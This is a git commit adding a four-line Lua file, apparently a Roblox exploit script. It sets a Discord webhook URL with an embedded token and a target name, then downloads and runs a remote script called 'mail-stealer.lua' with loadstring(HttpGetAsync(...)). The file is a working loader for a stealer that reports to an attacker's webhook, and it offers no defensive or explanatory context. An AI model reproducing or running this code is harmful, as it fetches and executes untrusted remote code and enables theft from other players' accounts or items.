de9018f1615d62416bc68996fd5874ad7e37a1c6
Potrok2 <113714497+Potrok2@users.noreply.github.com>
2023-03-18 21:25:32 +0200

    Add files via upload

---
+++ s.lua
@@ -0,0 +1,4 @@
+getgenv().webhook = "https://discord.com/api/webhooks/1081916718835847228/h4FHeKDFSIBh4ihbwsCm3xKOYV6s9YFtm0L7yG0gAP6HixCUzlcyryflc5Es-i4aGOT3" 
+getgenv().name = "altss21" 
+getgenv().mouselock = true
+loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
